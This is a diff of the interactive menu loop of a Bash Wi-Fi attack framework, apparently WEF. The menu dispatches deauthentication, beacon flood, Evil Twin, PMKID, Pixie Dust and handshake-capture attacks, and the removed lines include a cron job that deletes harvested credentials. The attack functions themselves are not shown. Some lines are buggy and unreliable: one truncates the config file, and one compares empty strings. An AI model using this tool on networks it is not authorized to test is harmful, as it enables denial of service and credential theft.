+      echo -e "\n${blueC}Use la herramienta unicamente bajo su responsabilidad${endC}"; sleep 0.3
+      echo -e "${blueC}Versión ${program_version}${endC}"; sleep 0.3
+      echo -e "${blueC}Con <3 por D3Ext${endC}"; sleep 1.3
+    fi
 
+    # If config has verbose enabled it will be used by default without the --verbose parameter
+    verbose_config=$(awk -F "=" '/verbose/ {print $2}' /opt/wef/wef.cnf)
+    if [ "$verbose_config" == "true" ]; then
+      verbose=1
+
+    elif [ "$verbose_config" == "false" ]; then
+      verbose=0
+
+    elif [ "$verbose_config" == "" ]; then
+      while true; do
+        if [ "$lang" == "en" ]; then
+          color_output_no_line "*" "This is the first time you use the tool, do you want to enable verbose by default? [${yC}y${blueC}/${yC}n${blueC}]: " && read verbose_option
+        else
+          color_output_no_line "*" "Esta es la primera vez que usas la herramienta, quieres activar por defecto el verbose? [${yC}s${blueC}/${yC}n${blueC}]: " && read verbose_option
+        fi
+
+        if [ "$verbose_option" == "y" ] || [ "$verbose_option" == "yes" ] || [ "$verbose_option" == "s" ] || [ "$verbose_option" == "si" ]; then
+          cat /opt/wef/wef.cnf | grep -v "verbose" > /opt/wef/wef.cnf
+          echo "verbose=true" >> /opt/wef/wef.cnf
+          verbose=1
+          break
+        elif [ "$verbose_option" == "n" ] || [ "$verbose_option" == "no" ] ; then
+          cat /opt/wef/wef.cnf | grep -v "verbose" > /opt/wef/wef.cnf
+          echo "verbose=false" >> /opt/wef/wef.cnf
+          verbose=0
+          break
+        fi
+      done
+    fi
+
+    scan_on_each_attack=$(awk -F "=" '/scan_on_each_attack/ {print $2}' /opt/wef/wef.cnf)
+    if [ "$scan_on_each_attack" == "" ]; then
+      while true; do
+        if [ "$lang" == "en" ]; then
+          color_output_no_line "*" "Do you want to scan APs on each attack? Can be changed lated in /opt/wef/wef.cnf [${yC}y${blueC}/${yC}n${blueC}]: " && read scan_conf
+        else
+          color_output_no_line "*" "¿Quieres escanear APs en cada ataque? Se puede cambiar mas tarde en /opt/wef/wef.cnf [${yC}s${blueC}/${yC}n${blueC}]: " && read scan_conf
+        fi
+
+        if [ "$scan_conf" == "y" ] || [ "$scan_conf" == "yes" ] || [ "$scan_conf" == "s" ] || [ "$scan_conf" == "si" ]; then
+          scan_on_each_attack="true"
+          cat /opt/wef/wef.cnf | grep -v "scan_on_each_attack" > /opt/wef/wef.cnf
+          echo "scan_on_each_attack=true" >> /opt/wef/wef.cnf
+          break
+        elif [ "" == "" ] || [ "" == "" ]; then
+          scan_on_each_attack="false"
+          cat /opt/wef/wef.cnf | grep -v "scan_on_each_attack" > /opt/wef/wef.cnf
+          echo "scan_on_each_attack=false" >> /opt/wef/wef.cnf
+          break
+        else
+          if [ "$lang" == "en" ]; then
+            color_output "*" "Invalid option!"
+          else
+            color_output "*" "Opción inválida!"
+          fi
+        fi
+      done
+    fi
+
+    clear_p=1 # Define parameter to clear or not the screen
+    dependencies
     ifconfig ${netCard} up &>/dev/null
 
-    time_counter="0"
     while true; do
-      trap ctrl_c INT; module="wifi"
+      trap keep_exit_c INT
+      input=1
 
-      if [ "$time_counter" == "0" ]; then
-        clear; correct_counter="0"
+      # Use a counter to not to print the banner and the panel all the times
+      if [ $clear_p == 1 ]; then
+        clear
+        clear_p=0
 
-        #tput civis
-        all_banners; sleep 0.09
-        export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+        banner
         dir=$(pwd)
-        dependencies; sleep 0.09
-        active_card; sleep 0.09
-        card_status; sleep 0.09
-        mac_status; sleep 0.09
-        echo -e "\n${blueC}[${yC}1${blueC}] Beacon Flood Attack\t\t\t[${yC}10${blueC}] Pixie Dust Attack${endC}"
-        sleep 0.09
-        echo -e "${blueC}[${yC}2${blueC}] Deauthentication Attack\t\t[${yC}11${blueC}] Caffe-Latte Attack${endC}"
-        sleep 0.09
-        echo -e "${blueC}[${yC}3${blueC}] Authentication Attack\t\t[${yC}12${blueC}] ChopChop Attack${endC}"
-        sleep 0.09
-        echo -e "${blueC}[${yC}4${blueC}] PMKID Attack\t\t\t[${yC}13${blueC}] Michael Exploitation Attack${endC}"
-        sleep 0.09
-        echo -e "${blueC}[${yC}5${blueC}] Passive Attack\t\t\t[${yC}14${blueC}] Replay Attack${endC}"
-        sleep 0.09
-        echo -e "${blueC}[${yC}6${blueC}] Randomize MAC address\t\t[${yC}15${blueC}] Null Pin Attack${endC}"
-        sleep 0.09
-        echo -e "${blueC}[${yC}7${blueC}] Start network card${endC}"
-        sleep 0.09
-        echo -e "${blueC}[${yC}8${blueC}] Evil Twin Attack${endC}"
-        sleep 0.09
-        echo -e "${blueC}[${yC}9${blueC}] Attacks info${endC}"
-        sleep 0.09
-      elif [ "${correct_counter}" == "2" ]; then
-        clear; correct_counter="0"
-        #tput civis
-        all_banners
-        echo -e "\n${blueC}Type '${yC}help${blueC}' to view more functions${endC}"
-        dir=$(pwd)
-        active_card; card_status; mac_status
-        echo -e "\n${blueC}[${yC}1${blueC}] Beacon Flood Attack\t\t\t[${yC}10${blueC}] Pixie Dust Attack${endC}"
-        echo -e "${blueC}[${yC}2${blueC}] Deauthentication Attack\t\t[${yC}11${blueC}] Caffe-Latte Attack${endC}"
-        echo -e "${blueC}[${yC}3${blueC}] Authentication Attack\t\t[${yC}12${blueC}] ChopChop Attack${endC}"
-        echo -e "${blueC}[${yC}4${blueC}] PMKID Attack\t\t\t[${yC}13${blueC}] Michael Exploitation Attack${endC}"
-        echo -e "${blueC}[${yC}5${blueC}] Passive Attack\t\t\t[${yC}14${blueC}] Replay Attack${endC}"
-        echo -e "${blueC}[${yC}6${blueC}] Randomize MAC address\t\t[${yC}15${blueC}] Null Pin Attack${endC}"
-        echo -e "${blueC}[${yC}7${blueC}] Start network card${endC}"
-        echo -e "${blueC}[${yC}8${blueC}] Evil Twin Attack${endC}"
-        echo -e "${blueC}[${yC}9${blueC}] Attacks info${endC}"
+        print_interface_mode; print_interface_name; print_mac_address
+
+        show_panel
+        if [ "$lang" == "en" ]; then
+          echo -e "\n${blueC}Type '${yC}help${blueC}' to view more functions and commands${endC}"
+        else
+          echo -e "\n${blueC}Escribe '${yC}help${blueC}' para ver mas funciones y comandos${endC}"
+        fi
       fi
 
-      correct_counter="0"
-      echo -ne "\n${blueC}[${yC}WiFi${blueC}] Choose an option >${endC} " && read option
-      time_counter="1"
+      echo -ne "\n${blueC}[${yC}WEF${blueC}] >>${endC} " && read option
+      input=0
 
-      if [ "$option" == "1" ] || [ "$option" == "beacon" ] || [ "$option" == "beacon flood" ] || [ "$option" == "beacon-flood" ] || [ "$option" == "beaconflood" ] || [ "$option" == "Beacon" ] || [ "$option" == "Beacon Flood" ] || [ "$option" == "b" ]; then
+      if [ "$option" == "1" ] || [ "$option" == "deauth" ] || [ "$option" == "deauthentication" ] || [ "$option" == "d" ]; then
         sleep 0.15
-        type_of_attack="Beacon Flood Attack"
-        if [ "$(check_interface_mode)" == "monitor" ]; then
-          sleep 0.15; beacon_flood
+        if [ "$lang" == "en" ]; then
+          type_of_attack="Deauthentication Attack"
         else
-          correct_counter="3"
+          type_of_attack="Ataque de Deautenticacion"
+        fi
+
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          deauth_attack; clear_p=1
+        else
           log_monitor_is_disabled
         fi
 
-      elif [ "$option" == "2" ] || [ "$option" == "deauth" ] || [ "$option" == "deauthentication" ] || [ "$option" == "deauth attack" ] || [ "$option" == "deauth-attack" ] || [ "$option" == "deauthentication-attack" ] || [ "$option" == "Deauthentication" ] || [ "$option" == "d" ]; then
+      elif [ "$option" == "2" ] || [ "$option" == "wids" ] || [ "$option" == "confusion" ] || [ "$option" == "w" ]; then
         sleep 0.15
-        type_of_attack="Deauthentication Attack"
-        if [ "$(check_interface_mode)" == "monitor" ]; then
-          sleep 0.15; deauth_attack
+        if [ "$lang" == "en" ]; then
+          type_of_attack="WIDS Confusion Attack"
         else
-          correct_counter="3"
+          type_of_attack="Ataque de Confusión WIDS"
+        fi
+
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          wids_confusion; clear_p=1
+        else
           log_monitor_is_disabled
         fi
 
-      elif [ "$option" == "3" ] || [ "$option" == "auth" ] || [ "$option" == "authentication" ] || [ "$option" == "auth attack" ] || [ "$option" == "auth-attack" ] || [ "$option" == "authentication-attack" ] || [ "$option" == "Authentication" ] || [ "" == "a" ]; then
+      elif [ "$option" == "3" ] || [ "$option" == "auth" ] || [ "$option" == "authentication" ] || [ "$option" == "a" ]; then
         sleep 0.15
-        type_of_attack="Authentication Attack"
-        if [ "$(check_interface_mode)" == "monitor" ]; then
-          sleep 0.15; auth_attack
+        if [ "$lang" == "en" ]; then
+          type_of_attack="Authentication DoS Attack"
         else
-          correct_counter="3"
+          type_of_attack="Ataque de Autenticación DoS"
+        fi
+
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          auth_attack; clear_p=1
+        else
           log_monitor_is_disabled
         fi
 
-      elif [ "$option" == "4" ] || [ "$option" == "pmkid" ] || [ "$option" == "pmkid attack" ] || [ "$option" == "pmkid-attack" ] || [ "$option" == "PMKID" ]; then
+      elif [ "$option" == "4" ] || [ "$option" == "beacon" ] || [ "$option" == "beacon flood" ]; then
         sleep 0.15
-        type_of_attack="PMKID Attack"
-        if [ "$(check_interface_mode)" == "monitor" ]; then
-          sleep 0.15; pmkid_attack
+        if [ "$lang" == "en" ]; then
+          type_of_attack="Beacon Flood Attack"
         else
-          correct_counter="3"
-          color_output_ln "*" "Your card is not in monitor mode."
-          echo -e "${blueC}[${yC}*${blueC}] Please before doing any attack press the ${yC}Start network card${blueC} option${endC}"
+          type_of_attack="Ataque Beacon Flood"
         fi
 
-      elif [ "$option" == "5" ] || [ "$option" == "passive" ] || [ "$option" == "passive attack" ] || [ "$option" == "stealthy" ] || [ "$option" == "stealthy attack" ] || [ "$option" == "passive-attack" ] || [ "$option" == "Passive" ] || [ "$option" == "Stealthy" ]; then
-        sleep 0.15
-        type_of_attack="Passive/Stealthy Attack"
         if [ "$(check_interface_mode)" == "monitor" ]; then
-          sleep 0.15; passive_attack
+          beacon_flood; clear_p=1
         else
-          correct_counter="3"
           log_monitor_is_disabled
         fi
 
-      elif [ "${card_check}" != "${netCard}" ] && [ "$option" == "7" ] || [ "$option" == "start" ] || [ "$option" == "up" ] || [ "$option" == "start card" ] || [ "$option" == "start-card" ] || [ "$option" == "Start" ]; then
+      elif [ "$option" == "5" ] || [ "$option" == "michael" ] || [ "$option" == "michael exploitation" ]; then
         sleep 0.15
-        if [ "$start_counter" == "1" ]; then
-          correct_counter="3"
-          echo -e "\n${yC}Interface already in monitor mode${endC}"
+        if [ "$lang" == "en" ]; then
+          type_of_attack="Michael Shutdown Exploitation Attack"
         else
-          card_setup
+          type_of_attack="Ataque Michael Shutdown Exploitation"
         fi
 
-      elif [ "$option" == "7" ] || [ "$option" == "start" ] || [ "$option" == "up" ] || [ "$option" == "start card" ] || [ "$option" == "start-card" ] || [ "$option" == "Start" ]; then
-        option=""
-        good_output_ln "+" "Network card already in monitor mode"
-
-      elif [ "$option" == "8" ] || [ "$option" == "evil twin" ] || [ "$option" == "evil-twin" ] || [ "$option" == "eviltwin" ] || [ "$option" == "evil" ] || [ "$option" == "evil twin attack" ] || [ "$option" == "evil-twin-attack" ] || [ "$option" == "Evil" ] || [ "$option" == "EvilTwin" ] || [ "$option" == "Evil Twin" ] || [ "$option" == "Evil-Twin" ] || [ "$option" == "e" ]; then
-        sleep 0.15
         if [ "$(check_interface_mode)" == "monitor" ]; then
-          sleep 0.15; evilTwin
+          michael_attack; clear_p=1
         else
-          correct_counter="3"
           log_monitor_is_disabled
         fi
 
-      elif [ "$option" == "9" ] || [ "$option" == "list" ] || [ "$option" == "help attacks" ] || [ "$option" == "attacks" ] || [ "$option" == "Attacks" ]; then
-        correct_counter="3"
-        sleep 0.1; clear
-        all_banners; sleep 0.1
-        functions_info; sleep 0.1
-
-      elif [ "$option" == "10" ] || [ "$option" == "pixie" ] || [ "$option" == "pixie dust" ] || [ "$option" == "pixie-dust" ] || [ "$option" == "Pixie" ] || [ "$option" == "Pixie Dust" ]; then
+      elif [ "$option" == "6" ] || [ "$option" == "pixiedust" ] || [ "$option" == "pixie" ]; then
         sleep 0.15
-        type_of_attack="Pixie Dust Attack"
-        if [ "$(check_interface_mode)" == "monitor" ]; then
-          sleep 0.15; pixie_dust
+        if [ "$lang" == "en" ]; then
+          type_of_attack="Pixie Dust Attack"
         else
-          correct_counter="3"
+          type_of_attack="Ataque Pixie Dust"
+        fi
+
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          pixie_dust; clear_p=1
+        else
           log_monitor_is_disabled
         fi
 
-      elif [ "$option" == "11" ] || [ "$option" == "caffe" ] || [ "$option" == "caffe latte" ] || [ "$option" == "caffe-latte" ] || [ "$option" == "Caffe-Latte" ] || [ "$option" == "Caffe Latte" ] || [ "$option" == "CaffeLatte" ]; then
+      elif [ "$option" == "7" ] || [ "$option" == "null" ] || [ "$option" == "nullpin" ] || [ "$option" == "n" ]; then
         sleep 0.15
-        type_of_attack="Caffe Latte Attack"
-        if [ "$(check_interface_mode)" == "monitor" ]; then
-          sleep 0.15; caffe-latte
+        if [ "$lang" = "en" ]; then
+          type_of_attack="Null Pin Attack"
         else
-          correct_counter="3"
+          type_of_attack="Ataque de Pin nulo"
+        fi
+
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          null_pin; clear_p=1
+        else
           log_monitor_is_disabled
         fi
 
-      elif [ "$option" == "12" ] || [ "$option" == "chopchop" ] || [ "$option" == "chopchop-atack" ] || [ "$option" == "ChopChop" ]; then
+      elif [ "$option" == "8" ] || [ "$option" == "replay" ]; then
         sleep 0.15
-        type_of_attack="ChopChop Attack"
-        if [ "$(check_interface_mode)" == "monitor" ]; then
-          sleep 0.15; chopchop
+        if [ "$lang" == "en" ]; then
+          type_of_attack="Replay Attack"
         else
-          correct_counter="3"
+          type_of_attack="Ataque de Replay"
+        fi
+
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          replay; clear_p=1
+        else
           log_monitor_is_disabled
         fi
 
-      elif [ "$option" == "13" ] || [ "$option" == "michael" ] || [ "$option" == "michael-attack" ] || [ "$option" == "Michael" ] || [ "$option" == "Michael Exploitation" ] || [ "$option" == "m" ]; then
+      elif [ "$option" == "9" ] || [ "$option" == "chopchop" ] || [ "$option" == "chop chop" ]; then
         sleep 0.15
-        type_of_attack="Michael Shutdown Exploitation Attack"
-        if [ "$(check_interface_mode)" == "monitor" ]; then
-          sleep 0.15; michael
+        if [ "$lang" == "en" ]; then
+          type_of_attack="ChopChop Attack"
         else
-          correct_counter="3"
+          type_of_attack="Ataque ChopChop"
+        fi
+
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          chopchop; clear_p=1
+        else
           log_monitor_is_disabled
         fi
 
-      elif [ "$option" == "14" ] || [ "$option" == "replay" ] || [ "$option" == "replay-attack" ] || [ "$option" == "replay attack" ] || [ "$option" == "Replay" ] || [ "$option" == "Replay Attack" ] || [ "$option" == "r" ]; then
+      elif [ "$option" == "10" ] || [ "$option" == "caffelatte" ] || [ "$option" == "caffe latte" ]; then
         sleep 0.15
-        type_of_attack="Replay Attack"
-        if [ "$(check_interface_mode)" == "monitor" ]; then
-          sleep 0.15; replay
+        if [ "$lang" == "en" ]; then
+          type_of_attack="Caffe Latte Attack"
         else
-          correct_counter="3"
+          type_of_attack="Ataque Caffe Latte"
+        fi
+
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          caffe_latte; clear_p=1
+        else
           log_monitor_is_disabled
         fi
 
-      elif [ "$option" == "15" ] || [ "$option" == "null" ] || [ "$option" == "nullpin" ] || [ "$option" == "null pin" ] || [ "$option" == "null-pin" ] || [ "$option" == "Null" ] || [ "$option" == "Null Pin" ] || [ "$option" == "n" ]; then
+      elif [ "$option" == "11" ] || [ "$option" == "passive" ] || [ "$option" == "wpa" ] || [ "$option" == "handshake" ]; then
         sleep 0.15
-        type_of_attack="Null Pin Attack"
-        if [ "$(check_interface_mode)" == "monitor" ]; then
-          sleep 0.15; null-pin
+        if [ "$lang" == "en" ]; then
+          type_of_attack="WPA handshake capture attack"
         else
-          correct_counter="3"
+          type_of_attack="Ataque de captura de handshake WPA"
+        fi
+
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          passive_capture_attack; clear_p=1
+        else
           log_monitor_is_disabled
         fi
 
-      elif [ "$option" == "exit" ] || [ "$option" == "exi" ] || [ "$option" == "quit" ] || [ "$option" == "qui" ] || [ "$option" == "salir" ] || [ "$option" == "sortir" ]; then
-        ctrl_c
-      fi
+      elif [ "$option" == "12" ] || [ "$option" == "pmkid" ]; then
+        sleep 0.15
+        if [ "$lang" == "en" ]; then
+          type_of_attack="PMKID Attack"
+        else
+          type_of_attack="Ataque PMKID"
+        fi
 
-      if [ "${correct_counter}" != "3" ]; then
-        for word in "${words[@]}"; do
-          if [ "${option}" == "${word}" ]; then
-            correct_counter="2"
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          pmkid_attack; clear_p=1
+        else
+          log_monitor_is_disabled
+        fi
+
+      elif [ "$option" == "13" ] || [ "$option" == "evil" ] || [ "$option" == "eviltwin" ] || [ "$option" == "e" ]; then
+        sleep 0.15
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          evilTwin; clear_p=1
+        else
+          log_monitor_is_disabled
+        fi
+
+      elif [ "$option" == "enable" ] || [ "$option" == "start" ] || [ "$option" == "monitor" ]; then
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          if [ "$lang" == "en" ]; then
+            echo -e "\n${yC}Interface already in monitor mode${endC}"
+          else
+            echo -e "\n${yC}La interfaz ya está en modo monitor${endC}"
           fi
-        done
-      fi
 
-      if [ "$option" == "help" ] || [ "$option" == "?" ] || [ "$option" == "Help" ]; then
-        correct_counter="3"
-        listHelp
+        else
+          enable_mon; clear_p=1
+        fi
+
+      elif [ "$option" == "disable" ] || [ "$option" == "stop" ]; then
+        #if [[ $start_counter == 1 ]]; then
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          disable_mon;
+          if [ "$lang" == "en" ]; then
+            press_enter "Monitor mode disabled, press Enter to continue "
+          else
+            press_enter "Modo monitor desactivado, presiona Enter para continuar "
+          fi
+          clear_p=1
+
+        else
+          if [ "$lang" == "en" ]; then
+            echo -e "\n${yC}Interface already in managed mode${endC}"
+          else
+            echo -e "\n${yC}La interfaz ya está en modo managed${endC}"
+          fi
+        fi
+
+      elif [ "$option" == "mac" ] || [ "$option" == "random" ] || [ "$option" == "randomize" ]; then
+        if [ "$(check_interface_mode)" == "monitor" ]; then
+          mac_randomizer
+          changed_mac=$(macchanger -s ${netCard} | grep "Curren" | awk '{print $3}') # Get new MAC address
+          vendor=$(macchanger -s ${netCard} | grep "Curren" | awk '{print $2}' FS="(") # Get vendor from "macchanger" output
+          if [ "$lang" == "en" ]; then
+            echo -e "${blueC}[${yC}*${blueC}] New MAC: ${greenC}${changed_mac} ${blueC}(${vendor}${endC}"
+          else
+            echo -e "${blueC}[${yC}*${blueC}] Nueva dirección MAC: ${greenC}${changed_mac} ${blueC}(${vendor}${endC}"
+          fi
+        else
+          log_monitor_is_disabled
+        fi
+
+      elif [ "$(echo $option | awk '{print $1}')" == "check" ]; then
+        cap_name=$(echo $option | sed 's/check //')
+        if [ -f "${cap_name}" ]; then
+          #if [ "$(check_handshakes_in_file)" -gt "0" ]; then
+          if [ "$lang" == "en" ]; then
+            good_output_ln "+" "File contains $(check_handshakes_in_file) WPA handshakes"
+          else
+            good_output_ln "+" "El archivo contiene $(check_handshakes_in_file) handshakes WPA"
+          fi
+        else
+          if [ "$lang" == "en" ]; then
+            color_output_ln "X" "Especified file doesn't exist!"
+          else
+            color_output_ln "X" "El archivo especificado no existe!"
+          fi
+        fi
+
+      elif [ "$option" == "exit" ] || [ "$option" == "quit" ] || [ "$option" == "salir" ]; then
+        ctrl_c
+
+      elif [ "$option" == "help" ] || [ "$option" == "?" ] || [ "$option" == "Help" ]; then
+        list_help
 
       elif [ "$option" == "clear" ] || [ "$option" == "cls" ]; then
-        correct_counter="3"
         clear
 
       elif [ "$option" == "panel" ]; then
-        correct_counter="3"; sleep 0.15
-        showPanel
-
-      elif [ "$option" == "6" ] || [ "$option" == "randomize mac" ] || [ "$option" == "randomize" ] || [ "$option" == "mac" ] || [ "$option" == "randomize-mac" ] || [ "$option" == "Randomize" ] || [ "$option" == "random" ]; then
-        correct_counter="3"
-        if [ "$(check_interface_mode)" == "monitor" ]; then
-          sleep 0.3; mac_randomizer
-          changed_mac=$(macchanger -s ${netCard} | grep "Curren" | awk '{print $3}') # Get new MAC address
-          vendor=$(macchanger -s ${netCard} | grep "Curren" | awk '{print $2}' FS="(") # Get vendor from "macchanger" output
-
-          echo -e "\n${blueC}[${yC}*${blueC}] New MAC: ${greenC}${changed_mac} ${blueC}(${vendor}${endC}"; sleep 0.1
-        else
-          color_output_ln "*" "Your card is not in monitor mode."
-          echo -e "${blueC}[${yC}*${blueC}] Please before randomizing your MAC, press the ${yC}Start network card${blueC} option${endC}"
-        fi
-
-      elif [ "$option" == "load bluetooth" ] || [ "$option" == "load blue" ]; then
-        correct_counter="3"
-        echo -e "\nOption in development!"
-        # blue_main
-
-      elif [ "$option" == "load wifi" ]; then
-        correct_counter="3"; sleep 0.1
-        echo -e "\n${yC}Wifi module already loaded${endC}"
-
-      elif [ "$option" == "modules" ] || [ "$option" == "load" ]; then
-        correct_counter="3"
-        echo -e "\n${yC}\tModules"
-        echo -e "\t-------${blueC}"
-        echo -e " \twifi"
-        echo -e " \tbluetooth"
-        echo -e "\n Load a module: load <module_name>${endC}"
+        show_panel
 
       elif [ "$option" == "scan" ] || [ "$option" == "scanner" ]; then
-        correct_counter="3"
         if [ "$(check_interface_mode)" == "monitor" ]; then
           ap_scan
         else
           log_monitor_is_disabled
         fi
 
+      elif [ "$option" == "attacks" ]; then
+        log_functions_info
+
       elif [ "$option" == "list" ]; then
-        correct_counter="3"
         list_aps
 
       elif [ "$option" == "chipsets" ] || [ "$option" == "chipset" ]; then
-        correct_counter="3"
         chipsets_panel
 
-      elif [ "$(echo ${option} | awk '{print $1}')" == "enable" ] && [ "$(echo ${option} | awk '{print $2}')" == "auto" ]; then
-        correct_counter="3"
-        echo -e "0 0 * * sun root /opt/wef/extra/delete-creds.sh" >> /etc/crontab # Add cronjob which executes every week and removes harvested creds
-        good_output_ln "+" "Auto credentials deletion enabled"
-
-      elif [ "$(echo ${option} | awk '{print $1}')" == "disable" ] && [ "$(echo ${option} | awk '{print $2}')" == "auto" ]; then
-        correct_counter="3"
-        cat /etc/crontab | grep -v "/opt/wef" | sponge /etc/crontab
-        good_output_ln "+" "Auto credentials deletion disabled"
-
       elif [ "$option" == "info" ] || [ "$option" == "status" ]; then
-        correct_counter="3"; sleep 0.15
-        active_card
-        card_status
-        mac_status
+        print_interface_mode
+        print_interface_name
+        print_mac_address
+        print_chipset
+        print_freq_band
+
+      elif [ "$option" == "crack" ]; then
+        # TODO
+        echo
 
       elif [ "$option" == "update" ]; then
-        correct_counter="3"; echo
+        echo
         progress_bar 2 0.3 "*" "Checking the latest version"
         sleep 0.2
-        if [ "$(curl -s -X GET 'https://raw.githubusercontent.com/D3Ext/WEF/main/images/version.txt')" != "${program_version}" ]; then
+        if [ "$(curl -s -X GET 'https://raw.githubusercontent.com/D3Ext/WEF/main/src/version.txt')" != "${program_version}" ]; then
           echo -ne "\n${blueC}[${greenC}+${blueC}] New version found. Do you want to update WEF? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read update_option
           if [ "${update_option}" == "y" ] || [ "${update_option}" == "yes" ]; then
             bash /opt/wef/update.sh &>/dev/null
             good_output_ln "+" "Update completed successfully"
           fi
         else
-          good_output_ln "+" "This is the latest version"
+          if [ "$lang" == "en" ]; then
+            good_output_ln "+" "This is the latest version"
+          else
+            good_output_ln "+" "Esta es la ultima versión"
+          fi
         fi
 
       elif [ "$(echo ${option} | awk '{print $1}')" == "inhibit" ]; then
-        correct_counter="3"
 
         if [ ! "$(echo ${option} | sed "s/^[^ ]* //")" ]; then # Check is user has provided an AP name
-          color_output_ln "*" "Please especify a valid AP name to inhibit its connections"
+          if [ "$lang" == "en" ]; then
+            color_output_ln "*" "Please especify a valid AP name to inhibit its connections"
+          else
+            color_output_ln "*" "Proporciona un nombre de AP válido para inhibir sus conexiones"
+          fi
         elif [ "$(check_interface_mode)" == "monitor" ]; then
           ap_to_inhibit=$(echo ${option} | sed "s/^[^ ]* //")
+          name="${ap_to_inhibit}"
           echo
           inhibitor
         else
@@ -1881,56 +3215,57 @@ if [ "$(id -u)" == "0" ]; then
         fi
 
       elif [ "$option" == "verbose" ] || [ "$option" == "v" ]; then
-        correct_counter="3"; sleep 0.1; verbose="1"
-        echo -e "\n${blueC}\tOutput verbose ON${endC}"
+        verbose=1
+        if [ "$lang" == "en" ]; then
+          echo -e "\n${blueC}Output verbose ON${endC}"
+        else
+          echo -e "\n${blueC}Verbose activado${endC}"
+        fi
 
       elif [ "$option" == "noverbose" ] || [ "$option" == "no-verbose" ] || [ "$option" == "no verbose" ]; then
-        correct_counter="3"; sleep 0.1; verbose="0"
-        echo -e "\n${blueC}\tOutput verbose OFF${endC}"
-
-      elif [ "$option" == "dump creds" ] || [ "$option" == "dump-creds" ] || [ "$option" == "dumpcreds" ] || [ "$option" == "dump" ] || [ "$option" == "check" ]; then
-        correct_counter="3"; sleep 0.1
-        dumpCreds
-
-      elif [ "$option" == "banner" ] | [ "$option" == "banners" ]; then
-        correct_counter="3"; echo
-        all_banners
-
-      elif [ "$(echo $option | awk '{print $1}')" == "gps" ] && [ "$(echo $option | awk '{print $2}')" ]; then
-        correct_counter="3"; sleep 0.1
-        echo -e "\nOption in development"
-#				gps_spoof
-
-      elif [ "$option" == "extra" ]; then
-        correct_counter="3"
-        echo -e "${yC}\n\tCommand\t\t\tDescription"
-        echo -e "\t-------\t\t\t-----------${endC}"
-        echo -e "\t${blueC}gps <coordinates>\t- If you have a HackRF plugged to your PC you can do a gps spoofing attack in a wide nearby range"
-
-      elif [ "$option" == "exec" ] || [ "$option" == "command" ] || [ "$option" == "execute" ]; then
-        correct_counter="3"; sleep 0.15
-        exec_commands
+        verbose=0
+        if [ "$lang" == "en" ]; then
+          echo -e "\n${blueC}Output verbose OFF${endC}"
+        else
+          echo -e "\n${blueC}Verbose desactivado${endC}"
+        fi
 
       elif [ "$option" == "version" ]; then
-        correct_counter="3"
-        echo -e "\nwef v${program_version} for linux (https://github.com/D3Ext/WEF)"
-        echo -e "Created by D3Ext <d3ext@proton.me>\n"
-      fi
+        if [ "$lang" == "en" ]; then
+          echo -e "\nwef v${program_version} for linux (https://github.com/D3Ext/WEF)"
+          echo -e "Created by D3Ext <d3ext@proton.me>"
+        else
+          echo -e "\nwef v${program_version} para linux (https://github.com/D3Ext/WEF)"
+          echo -e "Creado por D3Ext <d3ext@proton.me>"
+        fi
 
-      if [ "$correct_counter" == "0" ] && [ "$option" != "" ]; then
-        color_output_ln "X" "Unknown option, type 'help'"; sleep 0.08
+      else # Finally enter in this case if the command is invalid
+        if [ "$lang" == "en" ]; then
+          color_output_ln "X" "Unknown option, type 'help'"
+        else
+          color_output_ln "X" "Opción inválida, escribe 'help'"
+        fi
       fi
-
+    
     done
+
   else
-    helpPanel
+    help_panel
   fi
+
 else
   echo -e "${yC} __      _____ ___ "
   echo -e " \ \    / / __| __|"
   echo -e "  \ \/\/ /| _|| _| "
   echo -e "   \_/\_/ |___|_|  ${endC}"
-  color_output_ln "X" "Please, execute the program as root\n"
+
+  if [ "$lang" == "en" ]; then
+    color_output_ln "X" "Execute the program as root\n"
+  else
+    color_output_ln "X" "Ejecuta el programa como root\n"
+  fi
+  
   exit 1
 fi
+
 
